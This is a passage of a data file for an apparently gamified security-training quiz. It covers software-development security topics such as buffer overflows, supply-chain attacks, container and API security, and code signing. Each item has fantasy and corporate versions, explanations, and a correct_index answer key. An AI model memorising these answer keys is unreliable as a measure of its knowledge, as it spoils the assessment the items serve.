                "title": "THE TRAINING CURRICULUM",
                "narrative": """
You're developing security training for the development team. A junior developer
asks: "What's the most important thing we should learn about web application
security?"

The team lead suggests: "Just follow our internal coding standards - that should
be enough."

The DBA adds: "Focus on database security - that's where the data is."

A senior developer waves the Python documentation: "Just use the language
features correctly."

Where should developers FIRST look for guidance on the most common and critical
web application security vulnerabilities?
                """,
                "choices": [
                    {"text": "Follow only the company's internal coding standards"},
                    {"text": "Study the OWASP Top 10 - the industry standard for web security risks"},
                    {"text": "Read the programming language documentation"},
                    {"text": "Focus only on database security"}
                ],
                "success_text": """
"The foundation of web security training is the OWASP Top 10," you explain.

You pull up the OWASP website. "This list represents the security community's
consensus on the most critical risks. It's based on real vulnerability data
from hundreds of organizations."

You walk through the categories: "Injection, Broken Authentication, Sensitive
Data Exposure, XXE, Broken Access Control... These aren't theoretical - they're
the vulnerabilities that actually get exploited."

The team lead asks, "But we have internal standards..."

"Internal standards are good for consistency. But do they cover every OWASP
category? Are they updated when threats change? The OWASP Top 10 provides a
comprehensive, current baseline. Build internal standards ON TOP of OWASP,
not instead of it."

You make the OWASP Top 10 required reading for all developers.

You have directed developers to the OWASP TOP 10 as essential guidance.
                """,
                "failure_texts": {
                    0: """
Internal coding standards rarely provide comprehensive security guidance.
They focus on style, architecture, and project conventions. Security requires
specific knowledge of attack patterns and defenses. The OWASP Top 10 provides
this specifically - a regularly updated consensus of the most critical web
application security risks.
                    """,
                    2: """
Language documentation explains syntax and features, not application security.
Python docs won't teach you about XSS. JavaScript docs won't explain CSRF.
Security requires security-focused education. The OWASP Top 10 is specifically
designed to teach developers about real-world web vulnerabilities.
                    """,
                    3: """
Database security is important but incomplete. SQL injection is one risk among
many. What about XSS? Broken authentication? Insecure direct object references?
Comprehensive web security requires understanding ALL major risk categories.
The OWASP Top 10 provides this breadth.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
The OWASP Top 10 is the industry-standard awareness document for web application
security. It lists the most critical security risks based on real-world data
from the security community. Categories include Injection, Broken Authentication,
Sensitive Data Exposure, XXE, Broken Access Control, Security Misconfiguration,
XSS, Insecure Deserialization, Vulnerable Components, and Insufficient Logging.
Every web developer should understand and address these risks.
        """,
        "domain_reference": "Domain 8: Software Development Security - OWASP Top 10"
    },

    # Scenario 8: Buffer Overflow
    {
        "id": "d8_buffer_overflow",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE OVERFILLED VESSEL",
                "narrative": """
The Citadel's message processing crystal can hold exactly 100 runes per message.
When a mage submits a message, the crystal copies it into the processing chamber.

Yesterday, an attacker sent a message of 150 runes. The extra 50 runes overflowed
into the adjacent CONTROL CHAMBER, rewriting the crystal's command instructions.
The crystal began executing the attacker's commands instead of its intended function.

You're reviewing the crystal's design. What vulnerability is this, and what is
the BEST prevention approach?
                """,
                "choices": [
                    {"text": "Memory leak - add garbage collection"},
                    {"text": "Buffer overflow - implement bounds checking"},
                    {"text": "Race condition - add synchronization locks"},
                    {"text": "Integer overflow - use larger number types"}
                ],
                "success_text": """
"This is a BUFFER OVERFLOW," you explain to the crystal artificers. "The message
buffer holds 100 runes. When we copied 150 runes without checking the count,
the extra 50 overwrote adjacent memory - in this case, the control instructions."

You demonstrate the fix: "Before copying ANY data, we must CHECK THE LENGTH.
If the input exceeds our buffer, we either reject it or truncate it safely."

You show the corrected spell:
"IF message_length > buffer_size THEN reject_message"
"ELSE safe_copy(message, buffer, buffer_size)"

"Additionally, we should use SAFE COPY functions that always respect boundaries,
and enable STACK PROTECTION enchantments that detect overflow attempts."

The artificer asks, "Can't we just make the buffer bigger?"

"No. An attacker will just send bigger messages. The fix is CHECKING BOUNDS,
not increasing limits."

You have demonstrated BUFFER OVERFLOW PREVENTION through bounds checking.
                """,
                "failure_texts": {
                    0: """
Memory leaks are resource exhaustion issues where memory isn't freed. This
attack corrupts memory by writing beyond allocated boundaries - a buffer
overflow. Different vulnerability, different fix. Buffer overflows require
bounds checking, not garbage collection.
                    """,
                    2: """
Race conditions occur when timing between operations creates vulnerabilities.
This attack is about writing more data than a buffer can hold. There's no
timing issue - just failure to check input length against buffer size.
Bounds checking is the fix, not synchronization locks.
                    """,
                    3: """
Integer overflows occur when numeric values exceed their type limits and wrap
around. This attack writes too much data into a fixed-size buffer. The numbers
aren't overflowing - the buffer is. Bounds checking before copying is the fix.
                    """
                }
            },
            "corporate": {
                "title": "THE LEGACY APPLICATION",
                "narrative": """
The security scan flagged a critical vulnerability in a legacy C application.
When processing user-supplied input, the application uses strcpy() to copy
data into a fixed-size buffer without checking the input length.

An attacker sent a specially crafted 500-character input to a 100-character
buffer. The extra 400 characters overwrote the return address on the stack,
redirecting execution to attacker-supplied code.

The application has been running for 15 years. "It's never been a problem,"
says the developer. "Why fix it now?"

What vulnerability is this, and what is the BEST fix?
                """,
                "choices": [
                    {"text": "Memory leak - implement garbage collection"},
                    {"text": "Buffer overflow - use bounds checking and safe string functions"},
                    {"text": "Race condition - add thread synchronization"},
                    {"text": "Integer overflow - use 64-bit integers instead of 32-bit"}
                ],
                "success_text": """
"This is a classic stack buffer overflow," you explain. "strcpy() copies until
it hits a null terminator. It doesn't check if the destination buffer is big
enough. An attacker exploits this to overwrite the return address and execute
arbitrary code."

You show the fix: "Replace strcpy() with strncpy() or strlcpy() - functions
that enforce maximum lengths. Or better, use safer languages and libraries
that prevent this class of vulnerability entirely."

You demonstrate:
"strcpy(buf, input);  // DANGEROUS - no bounds check"
"strncpy(buf, input, sizeof(buf)-1);  // SAFER - enforces limit"
"buf[sizeof(buf)-1] = '\\0';  // Ensure null termination"

"Additionally, enable compiler protections: stack canaries, ASLR, DEP. These
make exploitation harder even if overflows occur."

The developer grumbles but implements the fix. The 15-year-old vulnerability
is finally closed.

You have demonstrated BUFFER OVERFLOW PREVENTION through bounds checking.
                """,
                "failure_texts": {
                    0: """
Memory leaks are resource issues (memory not freed). Buffer overflows are
security vulnerabilities (data exceeding buffer boundaries). Different problems,
different fixes. Buffer overflows require bounds checking, not garbage collection.
                    """,
                    2: """
Race conditions involve timing issues between concurrent operations. Buffer
overflows involve writing more data than a buffer can hold. No timing is
involved in this vulnerability. The fix is bounds checking, not synchronization.
                    """,
                    3: """
Integer overflow involves numeric values exceeding type limits. Buffer overflow
involves data exceeding allocated memory. Different vulnerability classes.
Buffer overflows are fixed by bounds checking, not integer type changes.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Buffer overflow occurs when data written to a buffer exceeds its allocated size,
overwriting adjacent memory. This can corrupt data, crash applications, or allow
code execution. Prevention requires: (1) BOUNDS CHECKING before copying data,
(2) SAFE STRING FUNCTIONS that enforce limits (strncpy vs strcpy), (3) COMPILER
PROTECTIONS like stack canaries and ASLR, and (4) SAFER LANGUAGES where possible.
Never trust input length - always validate before copying.
        """,
        "domain_reference": "Domain 8: Software Development Security - Buffer Overflow Prevention"
    },

    # Scenario 9: DevSecOps
    {
        "id": "d8_devsecops",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE DIVIDED GUILDS",
                "narrative": """
Three guilds are responsible for magical artifact creation: the Crafters Guild
(development), the Protectors Guild (security), and the Keepers Guild (operations).

Relations are... strained. Crafters resent Protectors for blocking their creations.
Protectors complain Crafters ignore security. Keepers blame both when artifacts
fail in production.

"Security is a bottleneck!" shouts the Crafter leader.
"Developers don't care about security!" retorts the Protector chief.
"Neither of you cares about reliability!" adds the Keeper master.

The Council asks you to propose a better approach. What organizational change
would BEST address these conflicts?
                """,
                "choices": [
                    {"text": "Give the Protectors Guild veto power over all releases"},
                    {"text": "Integrate security into crafting and operations through shared responsibility"},
                    {"text": "Remove the Protectors Guild from the release process entirely"},
                    {"text": "Only involve the Protectors Guild after artifact incidents"}
                ],
                "success_text": """
"The problem," you explain, "is that security is treated as a separate GATE
rather than an integral PART of creation. Let me propose a new model."

"Instead of Protectors reviewing finished artifacts, embed Protector apprentices
in Crafter teams. They participate in design. They review during creation, not
after. They share knowledge. Security becomes everyone's responsibility."

"But how do we ensure security is actually done?" asks the Protector chief.

"Automated scanning enchantments check every artifact automatically. Protectors
define the rules; enchantments enforce them. Protectors focus on complex risks
rather than routine checks."

"Keepers get visibility into both security and crafting decisions. Artifacts
are designed for reliable operation from the start."

The Council nods. "So instead of fighting over releases..."

"Everyone collaborates throughout. Security is built in, not bolted on. That's
the unity of purpose."

You have demonstrated DEVSECOPS principles of integrated security.
                """,
                "failure_texts": {
                    0: """
Veto power perpetuates adversarial relationships. Crafters will work around
Protectors rather than with them. The goal is collaboration and shared
responsibility, not concentrated power. Security should be a partner in
creation, not a final judge who can only say "no."
                    """,
                    2: """
Removing security from releases doesn't make security go away - it makes it
ABSENT. Without security involvement, vulnerabilities will reach production.
The answer isn't removing security; it's integrating it earlier and more
collaboratively so it doesn't block releases.
                    """,
                    3: """
Post-incident involvement is reactive and expensive. By the time an incident
occurs, damage is done. Security must be involved throughout the process,
preventing issues rather than only responding to them. DevSecOps integrates
security from the start.
                    """
                }
            },
            "corporate": {
                "title": "THE SECURITY BLOCKER",
                "narrative": """
The weekly release meeting is tense. Development has features ready to ship.
Security is blocking the release due to vulnerabilities. Operations is angry
at everyone for the delay.

"Security always blocks us!" the Dev Manager complains. "We can't ship anything!"
"You keep writing insecure code!" the Security Lead fires back.
"Neither of you tests in production!" adds the Ops Manager.

This conflict has persisted for months. Releases are delayed. Teams don't trust
each other. The CISO asks you to propose a cultural and process change.

What approach would BEST address these organizational challenges?
                """,
                "choices": [
                    {"text": "Give the security team veto power over all releases"},
                    {"text": "Implement DevSecOps - integrate security into development and operations"},
                    {"text": "Remove security from the release process"},
                    {"text": "Only involve security after production incidents"}
                ],
                "success_text": """
"The problem is organizational," you explain. "Security sits at the end as a
gate. By the time issues are found, it's too late to fix them efficiently.
DevSecOps changes this model."

You outline the transformation:
"1. SHIFT LEFT: Security requirements during planning. Threat modeling during
design. Security training for developers. Issues found EARLY when cheap to fix."

"2. AUTOMATE: SAST/DAST in CI/CD pipelines. Developers get immediate feedback.
No waiting for manual security review on routine issues."

"3. COLLABORATE: Security engineers embedded in dev teams. Shared responsibility.
Security as an enabler, not a blocker."

"4. MEASURE: Security metrics visible to everyone. Improvement over time. No
surprises at release time."

The CISO asks, "How does this help ops?"

"Infrastructure as code. Security scanning of configurations. Production security
is everyone's concern, built in from the start."

You have demonstrated DEVSECOPS principles of integrated security.
                """,
                "failure_texts": {
                    0: """
Veto power intensifies the adversarial dynamic. Development will resent security
even more. The goal is collaboration and shared ownership, not concentrated
blocking power. DevSecOps makes security a partner in development, not a final
barrier to be circumvented.
                    """,
                    2: """
Removing security from releases doesn't solve anything - it just removes the
safety net. Vulnerabilities will ship to production unchecked. The answer is
integrating security earlier (shift left) so it's not a last-minute blocker,
not removing it entirely.
                    """,
                    3: """
Post-incident involvement is the most expensive approach. Breaches cost orders
of magnitude more than prevention. DevSecOps integrates security throughout the
pipeline so issues are caught early, not after production incidents cause damage.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
DevSecOps integrates security into DevOps practices and culture. Key principles:
(1) SHIFT LEFT - involve security from requirements through design and development,
(2) AUTOMATE - security testing in CI/CD pipelines for immediate feedback,
(3) COLLABORATE - security as a partner, not a gate, with embedded expertise,
(4) SHARED RESPONSIBILITY - security is everyone's job, not just the security team.
This replaces adversarial "security as blocker" with collaborative "security as enabler."
        """,
        "domain_reference": "Domain 8: Software Development Security - DevSecOps"
    },

    # Scenario 10: CI/CD Pipeline Security
    {
        "id": "d8_pipeline_attack",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE CORRUPTED FORGE",
                "narrative": """
The Citadel's Artifact Forge automatically combines raw materials, enchantments,
and binding spells to produce magical items. Thousands of artifacts flow through
daily.

Yesterday, investigators discovered that a dark mage compromised the forge's
binding spell templates. Every artifact produced in the last month contains a
hidden curse - a backdoor that activates on command.

"But we checked the raw materials and the final artifacts!" protests the Forge
Master. "They all passed inspection!"

Where was the true attack vector, and what type of attack is this?
                """,
                "choices": [
                    {"text": "This is SQL injection targeting the artifact database"},
                    {"text": "This is a supply chain / pipeline attack on the build process"},
                    {"text": "This is a denial of service attack"},
                    {"text": "This is a phishing attack targeting forge workers"}
                ],
                "success_text": """
"The attack was brilliantly subtle," you explain. "They didn't tamper with
individual artifacts or raw materials. They compromised the FORGE ITSELF -
the build process that creates artifacts."

"By modifying the binding spell templates, every artifact that passed through
the forge was automatically cursed. Individual inspection couldn't detect this
because the curse was added DURING PRODUCTION, not before or after."

The Forge Master pales. "So thousands of artifacts..."

"All compromised. This is a SUPPLY CHAIN attack - targeting the development
pipeline rather than individual products. It's devastating because one compromise
affects everything that flows through."

"How do we prevent this?"

"Integrity verification of all build components. Signed templates. Immutable
build environments. Detection of unauthorized changes. The forge itself must
be as protected as its outputs."

You have identified a SUPPLY CHAIN / PIPELINE ATTACK.
                """,
                "failure_texts": {
                    0: """
SQL injection targets database queries. This attack targeted the build pipeline.
No database manipulation was involved - the attacker modified the build process
itself. This is supply chain compromise, a different and often more devastating
attack vector.
                    """,
                    2: """
Denial of service prevents access to services. This attack added malicious
functionality without disrupting production. In fact, the forge worked perfectly -
too perfectly, silently adding backdoors to everything it produced. Supply chain
attacks are about compromising output, not preventing it.
                    """,
                    3: """
Phishing targets humans through deceptive communications. This attack targeted
the build infrastructure itself. While the initial access might have involved
phishing, the actual vulnerability was the compromised build pipeline. Supply
chain security addresses this vector.
                    """
                }
            },
            "corporate": {
                "title": "THE COMPROMISED JENKINS",
                "narrative": """
Your security team discovers a nightmare scenario. An attacker gained access to
the CI/CD Jenkins server and modified build scripts. Every application built in
the last six weeks contains a backdoor that exfiltrates data.

"But we code review everything!" the Dev Manager protests. "We scan our code!"
"The code was clean," the Security Lead confirms. "The backdoor was added DURING
the build process, not in source code."

Thousands of customers are running compromised software. The applications passed
all security scans because the malicious code wasn't in the repository.

What type of attack is this?
                """,
                "choices": [
                    {"text": "SQL injection attack"},
                    {"text": "Supply chain / CI/CD pipeline attack"},
                    {"text": "Denial of service attack"},
                    {"text": "Phishing attack"}
                ],
                "success_text": """
"This is a supply chain attack targeting our CI/CD pipeline," you explain.
"The attacker didn't need to compromise our source code - they compromised
the BUILD PROCESS that turns source code into deployable software."

You diagram the attack: "Source code goes in clean. The build script adds
malicious code. The output contains the backdoor. Code review can't catch it
because the malicious code isn't in the repository."

"This is why SolarWinds was so devastating. Orion's source code was clean.
The build system was compromised. Every customer who updated got the backdoor."

The CTO asks, "How do we prevent this?"

"Multiple controls: Verified, immutable build environments. Signed build artifacts.
Build reproducibility - same source should produce identical binaries. Pipeline
as code with strict change control. Integrity monitoring of build infrastructure."

You initiate a full rebuild from trusted infrastructure and customer notification.

You have identified a SUPPLY CHAIN / PIPELINE ATTACK.
                """,
                "failure_texts": {
                    0: """
SQL injection targets database queries in applications. This attack targeted
the build pipeline that produces applications. The vulnerability wasn't in any
query - it was in the build infrastructure itself. Different attack vector,
different defense.
                    """,
                    2: """
Denial of service prevents access to services. This attack added malicious
functionality without disrupting the build process. The pipeline worked
perfectly - that was the problem. Supply chain attacks poison the well;
they don't stop it from flowing.
                    """,
                    3: """
Phishing might have been how the attacker initially gained access, but the
actual attack was compromising the CI/CD pipeline. The vulnerability was
inadequate protection of build infrastructure, not susceptibility to phishing.
Supply chain security specifically addresses build pipeline protection.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Supply chain attacks target the software build and distribution process rather
than the final product. By compromising CI/CD pipelines, attackers can inject
malicious code into every application built through that pipeline. Defense
requires: (1) PROTECTING build infrastructure as critical assets, (2) SIGNING
build artifacts for integrity verification, (3) REPRODUCIBLE builds where the
same source always produces the same output, and (4) MONITORING for unauthorized
pipeline changes.
        """,
        "domain_reference": "Domain 8: Software Development Security - CI/CD Pipeline Security"
    },

    # Scenario 11: Container Security
    {
        "id": "d8_container_security",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE SEALED VESSELS",
                "narrative": """
The Citadel uses enchanted vessels to contain and deploy magical services.
Each vessel is self-contained - everything the service needs is sealed inside
at creation time.

A security audit reveals concerning findings: many vessels were created over a
year ago and haven't been updated since. They contain old, vulnerable enchantments
that have since been patched in newer versions.

"But the vessels are SEALED," the Vessel Master argues. "They're isolated from
the outside world. Why would vulnerabilities in their contents matter?"

What is the flaw in the Vessel Master's logic?
                """,
                "choices": [
                    {"text": "Sealed vessels don't need patching because they're isolated"},
                    {"text": "Vessels contain vulnerable components that need regular updates and scanning"},
                    {"text": "Running vessels as root administrator makes them more secure"},
                    {"text": "Disabling vessel security features improves performance without risk"}
                ],
                "success_text": """
"Isolation is not invulnerability," you explain. "Yes, vessels are sealed. But
they still process INPUT from outside. An attacker exploiting a vulnerability
in a vessel's contents can compromise that vessel and potentially pivot further."

You show examples: "This vessel contains an old messaging enchantment with a
remote execution flaw. An attacker sends a crafted message to the vessel's
service port. The vessel IS isolated - but the attacker now controls it."

The Vessel Master considers. "So we need to..."

"REGULARLY UPDATE base enchantments. SCAN vessels for known vulnerabilities
before deployment. MONITOR for new vulnerabilities in deployed vessels. USE
minimal contents - only what the service actually needs."

"But rebuilding vessels is work..."

"Less work than incident response when a year-old vulnerability is exploited.
Containers aren't 'set and forget' - they require ongoing security maintenance."

You have demonstrated CONTAINER SECURITY best practices.
                """,
                "failure_texts": {
                    0: """
Isolation doesn't eliminate vulnerabilities - it (partially) contains their
impact. A vulnerable container can still be exploited through its exposed
services. Once compromised, attackers may escape the container or use it
as a foothold. Containers need regular updates just like any other software.
                    """,
                    2: """
Running containers as root INCREASES risk. If an attacker compromises a root
container, they have maximum privileges. Container security best practices
include running as non-root users, using minimal privileges, and enabling
security features - the opposite of this advice.
                    """,
                    3: """
Security features exist for good reasons. Disabling them for performance gains
is a dangerous tradeoff. The performance improvement is usually minimal while
the security degradation is significant. Keep security features enabled and
optimize performance in other ways.
                    """
                }
            },
            "corporate": {
                "title": "THE ANCIENT CONTAINERS",
                "narrative": """
The DevOps team reviews their Docker container inventory. Concerning findings:
many production containers use base images from two years ago. These images
contain known critical vulnerabilities in OpenSSL, glibc, and other core
components.

"Containers are isolated!" the lead DevOps engineer argues. "They can't affect
each other. Why would we need to update base images if the applications work?"

You note that these containers expose services to the internet and process
user-supplied data.

What is the security concern the engineer is missing?
                """,
                "choices": [
                    {"text": "Containers don't need patching because they're isolated"},
                    {"text": "Base images need regular updates and vulnerability scanning"},
                    {"text": "Running containers as root improves security"},
                    {"text": "Container security features should be disabled for performance"}
                ],
                "success_text": """
"Isolation helps contain breaches, but it doesn't prevent them," you explain.
"These containers expose web services. Attackers can send requests to those
services. If the container's OpenSSL has a remote code execution vulnerability,
an attacker can exploit it."

You show the CVE list for the old base images: "Log4Shell, multiple OpenSSL
CVEs, glibc buffer overflows... These are KNOWN vulnerabilities with public
exploits. Anyone can download the exploit code and target your containers."

"But updating images is disruptive..."

"Less disruptive than a breach. Here's what you need: (1) REGULAR base image
updates - rebuild containers with current images. (2) VULNERABILITY SCANNING
in your CI/CD pipeline - don't deploy images with critical CVEs. (3) MONITORING
of deployed containers for new vulnerabilities."

You help them implement automated image scanning in their build pipeline.

You have demonstrated CONTAINER SECURITY best practices.
                """,
                "failure_texts": {
                    0: """
Container isolation is not invulnerability. Containers still process external
input through their exposed services. Vulnerabilities in container components
can be exploited through those services. Isolation may limit blast radius but
doesn't prevent the initial compromise. Regular patching is essential.
                    """,
                    2: """
Running as root INCREASES risk. If attackers compromise a root container, they
have maximum privileges. Best practices include: run as non-root, drop
unnecessary capabilities, use read-only file systems where possible. Root
access makes exploitation more impactful, not less.
                    """,
                    3: """
Disabling security features trades real protection for marginal performance
gains. Seccomp, AppArmor, capability restrictions, and other container security
features exist to limit damage from compromise. Keep them enabled. Optimize
performance through proper resource allocation and efficient code.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Container security requires ongoing maintenance despite container isolation.
Key practices: (1) REGULARLY UPDATE base images - containers include operating
system components that need patches, (2) VULNERABILITY SCAN images in CI/CD
before deployment, (3) RUN AS NON-ROOT - minimize privileges, (4) ENABLE SECURITY
FEATURES like seccomp and AppArmor, (5) USE MINIMAL IMAGES with only required
components. Isolation limits blast radius but doesn't eliminate vulnerabilities.
        """,
        "domain_reference": "Domain 8: Software Development Security - Container Security"
    },

    # Scenario 12: API Security
    {
        "id": "d8_api_security",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE UNGUARDED ORACLE",
                "narrative": """
The Citadel's Oracle provides information services to allied kingdoms. Any
kingdom can query the Oracle for knowledge by sending a properly formatted
request.

A security review reveals concerning findings: the Oracle responds to ANY
request from ANY source. There's no verification of who's asking. Some queries
return information that should be restricted to specific kingdoms.

"The Oracle URLs are secret," the Oracle Keeper explains. "Only allies know how
to phrase the queries."

What security controls should the Oracle implement?
                """,
                "choices": [
                    {"text": "Make the query URLs longer and harder to guess"},
                    {"text": "Implement authentication, authorization, and rate limiting"},
                    {"text": "Only use POST requests instead of GET"},
                    {"text": "Add 'private' to the Oracle's name"}
                ],
                "success_text": """
"Secret URLs are not security," you explain. "They WILL be discovered. Attackers
monitor traffic. Allies get compromised. Query patterns are guessed."

You outline proper Oracle security:

"AUTHENTICATION: Every request must prove identity. Sealed tokens. Signed
credentials. The Oracle must VERIFY who is asking."

"AUTHORIZATION: Even authenticated kingdoms may not access everything. Verify
each requester has permission for the SPECIFIC information requested."

"RATE LIMITING: Prevent abuse. No kingdom should query thousands of times per
minute. Detect and block unusual patterns."

"LOGGING: Record all queries. Detect misuse. Enable investigation."

The Oracle Keeper nods. "So obscurity is not security..."

"Precisely. Security through obscurity fails as soon as the secret is known.
Proper controls work regardless of what attackers know about your system."

You have demonstrated proper API SECURITY controls.
                """,
                "failure_texts": {
                    0: """
URL obscurity is not security. Attackers discover URLs through traffic analysis,
OSINT, compromised allies, and simple guessing. Once discovered, an obscure URL
provides zero protection. Real security requires authentication and authorization
regardless of URL complexity.
                    """,
                    2: """
HTTP method (GET vs POST) is not an access control. Both can be easily sent by
attackers. POST provides no more protection than GET. Access control requires
authentication (verifying identity) and authorization (checking permissions),
not request method restrictions.
                    """,
                    3: """
Names are not security controls. Calling something "private" doesn't make it
private. Security requires technical controls: authentication to verify
identity, authorization to check permissions, encryption to protect data.
Labels without enforcement are meaningless.
                    """
                }
            },
            "corporate": {
                "title": "THE EXPOSED API",
                "narrative": """
The mobile team built a REST API for the new app. Security testing reveals
problems: anyone who knows the endpoint URLs can access sensitive data. There's
no authentication, authorization, or rate limiting.

"We didn't add security because only our app uses the API," the developer
explains. "The URLs are complex and not documented anywhere public."

You test the API. You can read any user's profile by changing the user ID in
the URL. You can access admin functions without any credentials.

What security controls should this API implement?
                """,
                "choices": [
                    {"text": "Make endpoint URLs longer and more random"},
                    {"text": "Implement authentication, authorization, and rate limiting"},
                    {"text": "Only accept POST requests"},
                    {"text": "Rename the API to include 'private' or 'internal'"}
                ],
                "success_text": """
"API security isn't optional because the URL is 'complex,'" you explain. "Anyone
can intercept the mobile app's traffic and extract those URLs. Let me show you."

You demonstrate with a proxy tool, capturing all API calls from the app.

"Here's what you need:"

"AUTHENTICATION: JWT tokens, OAuth, or API keys. Every request must prove
identity. Don't trust the client - verify on the server."

"AUTHORIZATION: Check permissions for every request. User A shouldn't access
User B's data. Non-admins shouldn't access admin endpoints. Verify on the server."

"RATE LIMITING: Prevent brute force, enumeration, and abuse. Block excessive
requests. Detect suspicious patterns."

"INPUT VALIDATION: The API must validate all input. Don't trust that the app
sends clean data - attackers will send whatever they want directly."

You help them implement proper API security. The exposed endpoints are now protected.

You have demonstrated proper API SECURITY controls.
                """,
                "failure_texts": {
                    0: """
URL complexity is security through obscurity - and obscurity fails. Attackers
will discover URLs by intercepting app traffic, reverse-engineering the app,
or simple brute force. Once known, a complex URL provides zero protection.
Use real security: authentication, authorization, rate limiting.
                    """,
                    2: """
HTTP method is not an access control. Attackers can send POST requests as easily
as GET. The method doesn't verify identity or check permissions. Real API security
requires authentication (who are you) and authorization (what can you access).
                    """,
                    3: """
Names don't provide security. "Internal" or "private" labels mean nothing to
attackers who can still reach the endpoint. Security requires technical controls
that enforce access restrictions, not naming conventions that request (but don't
enforce) privacy.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
API Security requires proper controls regardless of whether APIs are "internal"
or "complex." Key controls: (1) AUTHENTICATION - verify the identity of every
requester (OAuth, JWT, API keys), (2) AUTHORIZATION - check permissions for
every request, (3) RATE LIMITING - prevent abuse and brute force, (4) INPUT
VALIDATION - validate all input on the server, (5) ENCRYPTION - use HTTPS.
Security through obscurity (complex URLs, unlisted endpoints) provides no real
protection.
        """,
        "domain_reference": "Domain 8: Software Development Security - API Security"
    },

    # Scenario 13: Secure Deployment
    {
        "id": "d8_secure_deployment",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE REPLACED SCROLLS",
                "narrative": """
The Citadel distributes enchanted scrolls to allied kingdoms. Recently, a kingdom
reported that a scroll they received contained a curse instead of the intended
protection spell.

Investigation reveals that an attacker intercepted the delivery and replaced
the legitimate scroll with a malicious copy. The receiving kingdom had no way
to verify that the scroll was authentic.

"The delivery route was secure!" protests the Courier Master. "How could they
know it was replaced?"

What control would have allowed the kingdom to verify scroll authenticity?
                """,
                "choices": [
                    {"text": "Deploy scrolls faster to reduce interception opportunities"},
                    {"text": "Use cryptographic sealing with signature verification"},
                    {"text": "Keep deployment procedures secret"},
                    {"text": "Only deploy on specific days of the week"}
                ],
                "success_text": """
"Speed and secrecy won't help if you can't VERIFY authenticity," you explain.
"What we need is CRYPTOGRAPHIC SEALING - a magical signature that proves the
scroll originated from us and wasn't modified."

You demonstrate: "Before deployment, we seal each scroll with our Citadel's
secret binding. The allied kingdom can verify this seal using our public emblem.
If the seal doesn't match - the scroll was tampered with or replaced."

The Courier Master asks, "But what if someone copies our seal?"

"They can't. The seal is created using our secret binding which only we possess.
Others can VERIFY the seal but cannot CREATE it. Even if an attacker intercepts
the scroll, they cannot create a valid seal for their replacement."

You implement code signing for all scroll deployments. Kingdoms now verify
authenticity before use.

You have demonstrated SECURE DEPLOYMENT through code signing.
                """,
                "failure_texts": {
                    0: """
Speed doesn't verify authenticity. A faster delivery still delivers whatever
the courier carries - legitimate or malicious. Even with instant delivery, if
you can't verify the package came from the expected source and wasn't modified,
you can't trust it. Signature verification solves this regardless of speed.
                    """,
                    2: """
Secret procedures don't verify authenticity. Attackers can discover procedures
through observation, social engineering, or compromised insiders. Once they
know the procedure, secrecy provides no protection. Cryptographic signatures
work regardless of whether attackers know your procedures.
                    """,
                    3: """
Timing doesn't verify authenticity. Whether you deploy Monday or Friday, you
still need a way to verify packages weren't tampered with. Cryptographic
signatures provide this verification regardless of deployment timing.
                    """
                }
            },
            "corporate": {
                "title": "THE MALICIOUS UPDATE",
                "narrative": """
The company distributes software updates to thousands of customer installations.
Recently, customers reported malware in an update - investigation reveals an
attacker compromised a distribution mirror and replaced the legitimate update
with a malicious version.

Customers downloaded and installed it because it appeared to come from the
official distribution channel.

"The mirror was supposed to be secure!" the Release Manager protests.

What control would have allowed customers to detect the tampered update?
                """,
                "choices": [
                    {"text": "Faster release cycles to reduce window for attack"},
                    {"text": "Code signing and signature verification before installation"},
                    {"text": "Keeping distribution procedures confidential"},
                    {"text": "Only releasing updates on specific days"}
                ],
                "success_text": """
"The issue is that customers couldn't VERIFY the update was authentic," you
explain. "Code signing solves this."

You diagram the solution: "We sign every release with our private key. Customers
verify the signature with our public key before installation. If an attacker
replaces the package, they can't create a valid signature - they don't have our
private key."

The Release Manager asks, "But the attacker controlled the mirror..."

"Doesn't matter. They can distribute whatever they want, but they can't SIGN it
with our key. Customers' verification will reject unsigned or incorrectly signed
packages."

You implement code signing:
"1. Build package
2. Sign with private key
3. Distribute
4. Customer downloads
5. Customer verifies signature
6. Only install if signature valid"

The tampered update would have been rejected at step 5 if code signing were in place.

You have demonstrated SECURE DEPLOYMENT through code signing.
                """,
                "failure_texts": {
                    0: """
Faster releases don't prevent tampering. Whether you release daily or monthly,
you still need a way for customers to verify authenticity. Speed reduces the
window of opportunity slightly but doesn't eliminate the vulnerability. Code
signing provides verification regardless of release frequency.
                    """,
                    2: """
Confidential procedures don't verify authenticity. Attackers discover procedures
through various means. Once they control a distribution point, knowing the
procedure just helps them blend in. Cryptographic signatures verify authenticity
regardless of what attackers know about your procedures.
                    """,
                    3: """
Release timing doesn't verify authenticity. Whether you release on Tuesdays or
Fridays, customers still need to verify updates weren't tampered with. Code
signing provides this regardless of when releases occur.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Secure software deployment requires verifiable authenticity and integrity.
CODE SIGNING uses cryptographic signatures: developers sign packages with private
keys, users verify with public keys. This proves packages are from the expected
source and haven't been tampered with. Even if attackers compromise distribution
channels, they can't create valid signatures without the private key. Always
verify signatures before installation. Speed and secrecy don't substitute for
cryptographic verification.
        """,
        "domain_reference": "Domain 8: Software Development Security - Secure Deployment"
    },

    # Scenario 14: Third-Party Risk
    {
        "id": "d8_third_party_risk",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE BORROWED ENCHANTMENTS",
                "narrative": """
The Citadel's artifacts incorporate enchantments from dozens of external sources
- allied mages, foreign guilds, and ancient repositories. An audit reveals that
one borrowed enchantment, used in 50 of your artifacts, contains a hidden curse.

